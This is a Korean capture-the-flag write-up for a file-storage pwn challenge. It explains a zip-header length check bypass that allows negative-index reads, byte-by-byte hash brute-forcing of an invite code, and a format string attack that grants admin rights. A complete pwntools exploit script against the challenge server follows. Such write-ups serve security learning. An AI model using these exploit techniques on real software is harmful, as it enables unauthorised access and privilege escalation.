`FSB` 취약점을 사용할 수 있는 상황이 된다면 어떻게든 `flag`를 읽을 수 있습니다. `FSB` 취약점은 `viewFile` 함수에 있으며, `FSB`를 트리거하기 위해선 `askUserAndPass` 함수를 통과해야 합니다. 하지만 `Tom`의 비밀번호는 모르므로 `1. Tom의 비밀번호를 알아낸다.`와 `2. 새로운 사용자를 만든다.`의 두 가지 접근 방법이 있습니다. 그런데 `askUserAndPass` 함수에서 입력 받는 길이는 49바이트인데, `Tom`의 비밀번호는 63바이트이므로 `Tom`의 비밀번호를 알아내도 사용할 수 없기에 2번의 방법을 사용합니다.
새로운 사용자는 `createUser` 함수를 통해 만들 수 있지만, `checkInvite` 함수를 통과해야 합니다. 즉 `invite.zip` 안의 `invitecode.txt`의 내용을 읽을 수 있어야 합니다. 정리하자면, `Tom`의 0번째 파일인 `invitecode.txt`의 내용을 읽는다면 `flag`를 읽을 수 있습니다.

<br>
`askUserAndPass` 함수를 통과하지 못하는 상황에서 우리가 입력할 수 있는 것은 `uploadFile` 함수를 통한 zip 파일 뿐입니다. 그런데 우리가 입력한 파일은 `invite.zip` 뒤에 저장되기 때문에 음수 인덱스 접근이 가능해야 합니다. 이제
1. 음수 인덱스 접근
2. `invitecode.txt` 내용을 가져올 방법
을 생각해야 합니다. 2번을 생각해보면 우리는 아무 권한도 없는 상황에서 파일의 제목, 길이, 해시 값을 알 수 있습니다. 여기서는 해시 값으로만 데이터의 정보를 확인할 수 있습니다. 해시 값을 조종하려면 제목의 길이를 음수로 만들어야 한다는 결론이 나옵니다.

<br>
```asm
mov     rax, [rbp+var_8]
mov     eax, [rax]
mov     [rbp+var_14], eax
mov     eax, [rbp+var_14]
cwde
cmp     [rbp+var_14], eax
jz      short loc_1717
lea     rdi, aExtraFieldNotS
call    _puts
jmp     locret_184F
```
제목의 길이를 음수로 만들 수 없던 것은  `readZipInfo` 함수의 세 번째 조건문, `v7 = (_DWORD *)(a2 + 26); v6 = *v7; if ( v6 == (__int16)v6 )` 때문입니다. `File name len`이 `0xffff`라고 가정해봅시다. `cwde`에 의해 `eax`가 `0xffffffff`가 되기 때문에 `[rbp-0x14] != eax`가 됩니다. 이를 우회하는 방법은 모순적이게도 `Extra field len`을 사용하는 것입니다. 처음에 `rax`의 형태로 8바이트를 읽어옴을 알 수 있습니다. `rax`가 `0xffffffff`라면 `cwde` 후에도 `0xffffffff`이기 때문에 값이 같습니다. 이렇게 음수 인덱스에 접근할 수 있습니다.

<br>
파일 데이터 전에는 고정된 값 9바이트가 존재합니다. 따라서 `File name len + Extra field len`이 변조된 10바이트짜리 zip 파일을 입력하고 해시 값을 받아오면, 마지막 바이트 브루트포싱을 통해 `invitecode.txt`의 내용을 한 글자씩 알아올 수 있습니다.
`invitecode.txt`를 얻었으니 위의 브레인스토밍 과정을 역으로 따라가면 됩니다. 새로운 사용자를 만들고, `FSB`를 유발하는 zip 파일을 업로드하고, 이를 읽어 `admin` 권한을 부여하는 `FSB` payload를 작동하고 `flag`를 읽습니다.

<br>
- 솔버

```python
from pwn import *
from tqdm import *
import subprocess

context.bits = 64
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('myfiles.chal.irisc.tf', 10001)
#p = process('./chal')

def listfiles(idx : int, idx2 : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'? ', str(idx).encode())
    payload = f"[FID={idx2}]  10 "
    p.recvuntil(payload.encode())
    return p.recvline()[:-1].decode()

def createuser(name : bytes, password : bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'? ', invite_code)
    p.sendlineafter(b'? ', name)
    p.sendlineafter(b'? ', password)

def uploadfile(idx : int, z : bytes):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'? ', str(idx).encode())
    p.sendlineafter(b'uncompressed file', z)

def viewfile(idx : int, password : bytes, idx2 : int):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'? ', str(idx).encode())
    p.sendlineafter(b'? ', password)
    p.sendlineafter(b'? ', str(idx2).encode())

def viewflag(idx : int, password : bytes):
    p.sendlineafter(b'> ', b'6')
    p.sendlineafter(b'? ', str(idx).encode())
    p.sendlineafter(b'? ', password)

def crackhash(h : str):
    v5 = 0xCBF29CE484222325
    for i in range(-9, 0):
        v5 = 0x100000001B3 * (ord(invite_code[i]) ^ v5)

    for i in range(256):
        v6 = (0x100000001B3 * (i ^ v5)) & ((1 << 64) - 1)
        if hex(v6)[2:] == h:
            return chr(i)

start_num = -516 + 14 - 9
tb = bytearray(open('./tb.zip', 'rb').read())
ex = bytearray(open('./ex.zip', 'rb').read())
invite_code = ""

for i in trange(20):
    num = start_num - (515 * i)
    a = p32(num & 0xffffffff)
    tb[26:30] = a
    uploadfile(15, tb.hex().encode())
    h = listfiles(15, i + 1)
    invite_code += crackhash(h)

invite_code = invite_code[-20:]
print(invite_code)

#invite_code = b"yelling-pixel-corals"
#invite_code = b'terrible-red-busses'

createuser(b'csh', b'csh')
uploadfile(0, ex.hex().encode())
viewfile(0, b'csh', 0)
pie_base = int(p.recvuntil(b' ')[:-1], 16) - 0x5040
wantsetadd = pie_base + 0x5040 + 0x10
print(hex(pie_base))

subprocess.run(['rm', 'ex2.txt'])
ex2 = open('./ex2.txt', 'wb')
payload = fmtstr_payload(14, {wantsetadd:1})
ex2.write(payload)
ex2.close()
subprocess.run(['rm', 'ex2.zip'])
subprocess.run(['zip', '-X', '-0', 'ex2.zip', 'ex2.txt'])
ex2 = open('./ex2.zip', 'rb').read()
print(ex2)
uploadfile(0, ex2.hex().encode())
print(hex(wantsetadd))
viewfile(0, b'csh', 1)
viewflag(0, b'csh')
p.interactive()

# zip -X -0 tb.zip tb.txt
```

<br>
- 후일담

`Finder(이재영)`가 아주 중요한 아이디어를 불어넣어 줘서 이 문제를 풀었다 해도 과언이 아닐 정도로 저에게 많은 도움을 주었습니다. 이 글을 빌러 고맙다는 말을 전합니다.
